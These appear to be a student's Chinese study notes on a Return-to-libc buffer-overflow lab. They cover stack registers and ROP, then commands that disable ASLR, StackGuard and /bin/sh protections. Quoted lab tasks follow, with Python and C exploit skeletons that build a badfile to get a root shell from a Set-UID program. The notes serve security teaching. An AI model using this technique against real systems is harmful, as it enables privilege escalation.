# Return_to_Libc

## 知识点

1. **[question]**P93

2. **[question]**P96

3. **函数的序言**：函数开头处的代码，用于为函数准备栈和指针，

   ```assembly
   pushl %ebp			// 保存ebp值（它目前指向调用者的栈帧）
   movl %esp, %ebp		// 让ebp指向被调用者的栈帧
   subl $N, %esp		// 为局部变量预留空间
   ```

   **函数的后记**：函数末尾处的代码，用于恢复栈和寄存器到函数调用以前的状态。

   ```assembly
   movl %ebp, %esp		// 释放为局部变量开辟的栈空间 
   popl %ebp			// 让ebp指回调用者函数的栈帧
   ret					// 返回
   ```

4. **EBP**是当前函数的存取指针，即存储或者读取数时的指针基地址只是存取某时刻的栈顶指针,以方便对栈的操作,如获取函数参数、局部变量等；

   **ESP**就是当前函数的栈顶指针，一直指向栈顶的指针。

   **EIP**：寄存器里存储的是CPU下次要执行的指令的地址。也就是调用完fun函数后，让CPU知道应该执行main函数中的printf（"函数调用结束"）语句了。

5. **return_to_lib**中，函数结束时的返回地址不能随意，很可能导致程序崩溃，一个较好的办法是使用exit()函数。

6. **返回导向编程**（Return-Oriented Programming，ROP）：不一定要返回到一个已有函数，巧妙地将内存中的一些小的指令序列串起来，这些指令序列其实并不放在一起，但它们的最后一个指令都是return。

7. **void \*memset(void \*str, int c, size_t n)** 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。

8. **gdb -q**：-quiet，退出，不打印介绍信息和版权信息，这些消息在批处理模式下也不打印

9. 程序名称的长度会影响所有的环境变量的地址

10. 

## 习题

## 实验

### Turning off countermeasures

- Address Space Randomization. `sudo sysctl -w kernel.randomize_va_space=0`

- The StackGuard Protection Scheme  `gcc -fno-stack-protector example.c`

- Non-Executable Stack.

  ```sh
  For executable stack:
  gcc -z execstack  -o test test.c
  For non-executable stack:
  gcc -z noexecstack  -o test test.c
  ```

  由于本实验室的目标是显示不可执行堆栈保护不起作用，因此您应该始终使用本实验室中的`-z noexecstack`选项编译程序。

- Configuring /bin/sh (Ubuntu 16.04 VM only). `sudo ln -sf /bin/zsh /bin/sh`

### The Vulnerable Program

关闭地址随机化，关闭StackGuard，打开不可执行栈，执行脆弱程序，出现段错误

![image-20211011130241366](D:\git_repository\computer_security\学习笔记\5 Return_to_Libc.assets\image-20211011130241366.png)

### Task 1: Finding out the addresses of libc functions

> ​		在Linux中，当程序运行时，libc库将加载到内存中。关闭内存地址随机化后，对于同一程序，库始终加载在同一内存地址中（对于不同的程序，libc库的内存地址可能不同）。因此，我们可以使用gdb之类的调试工具轻松找到system() 的地址。也就是说，我们可以调试目标程序retlib。即使该程序是root所有的Set-UID程序，我们仍然可以调试它，但特权将被删除（即，有效用户ID将与实际用户ID相同）。在gdb内部，我们需要键入run命令来执行目标程序一次，否则，库代码将无法加载。我们使用p命令（或print）打印出system() 和exit() 函数的地址（稍后需要exit() ）。
>
> ​		应该注意的是，即使对于同一个程序，如果我们将其从Set-UID程序更改为非Set-UID程序，libc库也可能不会加载到相同的位置。因此，当我们调试程序时，需要调试目标设置UID程序；否则，我们得到的地址可能不正确。

![image-20211011130140888](D:\git_repository\computer_security\学习笔记\5 Return_to_Libc.assets\image-20211011130140888.png)

### Task 2: Putting the shell string in the memory

> ​		我们的攻击策略是跳转到system() 函数，让它执行任意命令。因为我们希望得到一个shell提示符，所以希望system() 函数执行`/bin/sh`程序。因此，命令字符串`/bin/sh`必须首先放在内存中，我们必须知道它的地址（这个地址需要传递给system() 函数）。实现这些目标有很多方法；我们选择使用环境变量的方法。鼓励学生使用其他方法。
>
> ​		当我们从shell提示符执行程序时，shell实际上会生成一个子进程来执行程序，并且所有导出的shell变量都会成为子进程的环境变量。这为我们在子进程的内存中放入任意字符串创建了一种简单的方法。让我们定义一个新的shell变量MYSHELL，并让它包含字符串`/bin/sh`。通过以下命令，我们可以验证字符串是否进入子进程，并由在子进程内运行的env命令打印出来。
>
> ```shell
> export MYSHELL=/bin/sh
> env | grep MYSHELL
> MYSHELL=/bin/sh
> ```
>
> ​		我们将使用此变量的地址作为system（）调用的参数。使用以下程序可以轻松找到该变量在内存中的位置：
>
> ```c
> void main(){
>     char* shell =  getenv("MYSHELL");
>     if (shell)
>     	printf("%x\n", (unsigned int)shell);
> }
> ```
>
> ​		如果关闭地址随机化，您将发现打印出的地址相同。但是，当您运行脆弱程序retlib时，环境变量的地址可能与您通过运行上述程序获得的地址不完全相同；这样的地址甚至可以在更改程序名时更改（文件名中的字符数会有所不同）。好消息是，shell的地址将非常接近使用上述程序打印的内容。因此，您可能需要尝试几次才能成功。

注意头文件，运行结果如下：

![image-20211011130122030](D:\git_repository\computer_security\学习笔记\5 Return_to_Libc.assets\image-20211011130122030.png)

### Task 3: Exploiting the buffer-overflow vulnerability

> ​		我们已经准备好创建badfile的内容。由于内容涉及一些二进制数据（例如，libc函数的地址），我们可以使用C或Python进行构造。
>
> 使用Python。我们在下面提供了一个代码框架，剩下的基本部分供您填写。
>
> ```python
> #!/usr/bin/python3
> import sys
> 
> #Fill content with non-zero values
> content = bytearray(0xaa for i in range(300))
> 
> X = 0
> sh_addr = 0x00000000  # The address of "/bin/sh"
> content[X:X+4] = (sh_addr).to_bytes(4,byteorder=’little’)
> 
> Y = 0
> system_addr = 0x00000000  # The address of system()
> content[Y:Y+4] = (system_addr).to_bytes(4,byteorder=’little’)
> 
> Z = 0
> exit_addr = 0x00000000  # The address of exit()
> content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder=’little’)
> 
> Save content to a file
> 
> with open("badfile", "wb") as f:
> 	f.write(content)
> ```
>
> ​		您需要计算出这三个地址以及X、Y和Z的值。如果您的值不正确，您的攻击可能无法工作。在您的报告中，您需要描述如何确定X、Y和Z的值。或者向我们展示您的推理，或者，如果您使用试错法，则展示您的试验。
>
> 使用C语言。我们还为您提供了C代码的框架，剩下的基本部分供您填写。
>
> ```c
> /*exploit.c*/
> #include <stdlib.h>
> #include <stdio.h>
> #include <string.h>
> 
> int main(int argc, char**argv)
> {
> 	char buf[40];
> 	FILE*badfile;
> 
>     badfile = fopen("./badfile", "w");
>     /*You need to decide the addresses and
>     the values for X, Y, Z. The order of the following
>     three statements does not imply the order of X, Y, Z.
>     Actually, we intentionally scrambled the order.*/
>     *(long*) &buf[X] = some address ;  //  "/bin/sh" 💡
>     *(long*) &buf[Y] = some address ;  //  system()  💡
>     *(long*) &buf[Z] = some address ;  //  exit()    💡
> 
>     fwrite(buf, sizeof(buf), 1, badfile);
>     fclose(badfile);
>     
>     return 0；
> }
> ```
>
> ​		您需要在标有💡的行中找出地址，并找出存储这些地址的位置（即X、Y和Z的值）。如果您的值不正确，您的攻击可能无法工作。在您的报告中，您需要描述如何确定X、Y和Z的值。或者向我们展示您的推理，或者，如果您使用试错法，则展示您的试验。
>
> ​		完成上述程序后，编译并运行；这将生成badfile的内容。运行易受攻击的程序retlib。如果您的漏洞被正确实现，当函数bof() 返回时，它将返回到system() 函数，并执行`system（“/bin/sh”）`。如果易受攻击的程序以root权限运行，此时您可以获得root shell。
>
> ```shell
>  gcc -o exploit exploit.c
> ./exploit  // create the badfile
> ./retlib  // launch the attack by running the vulnerable program
> 
> <---- You’ve got a root shell!
> ```
>
> ​		**攻击变体1**：exit() 函数真的有必要吗？请尝试攻击，但不要在badfile中包含此函数的地址。再次发起攻击，报告并解释您的观察结果。
>
> ​		**攻击变体2**：攻击成功后，将retlib的文件名更改为其他名称，确保新文件名的长度不同。例如，您可以将其更改为OneWretlib。重复攻击（不更改badfile的内容）。你的攻击会成功吗？如果没有成功，请解释原因。



